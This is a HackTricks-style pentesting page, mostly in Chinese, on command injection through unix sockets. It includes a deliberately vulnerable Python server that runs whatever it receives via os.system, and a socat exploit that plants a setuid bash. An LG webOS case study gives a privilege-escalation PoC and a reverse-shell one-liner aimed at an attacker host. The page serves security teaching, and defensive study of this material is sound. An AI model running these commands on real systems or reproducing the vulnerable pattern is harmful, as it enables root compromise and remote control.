# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

在下面的示例中，会创建一个 **unix socket** (`/tmp/socket_test.s`)，接收到的所有内容都会被 `os.system` **执行**。我知道你在现实中可能找不到这样的例子，但这个示例的目的是让你看到使用 unix sockets 的代码长什么样，并在最坏的情况下如何处理输入。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**执行** 使用 python 运行代码: `python s.py` 并 **检查 socket 的监听状态**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)

一些特权 daemon 会暴露一个 root-owned UNIX socket，该 socket 接受不受信任的输入，并将特权操作与 thread-IDs 和 signals 关联。如果协议允许 unprivileged client 影响哪个 native thread 成为目标，你可能能够触发特权代码路径并实现提权。

Observed pattern:
- 连接到一个 root-owned socket（例如 /tmp/remotelogger）。
- 创建一个 thread 并获取其 native thread id (TID)。
- 将 TID（packed）加上 padding 作为请求发送；接收 acknowledgement。
- 向该 TID 发送特定的 signal 以触发特权 behaviour。

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
要将其转为 root shell，可以使用一个简单的 named-pipe + nc 模式：
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
说明：
- 这类漏洞源于信任从非特权客户端状态派生的值（TIDs），并将其绑定到特权的信号处理程序或逻辑上。
- 通过在 socket 上强制验证凭据、校验消息格式，并将特权操作与外部提供的线程标识符分离来加固。

## References

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
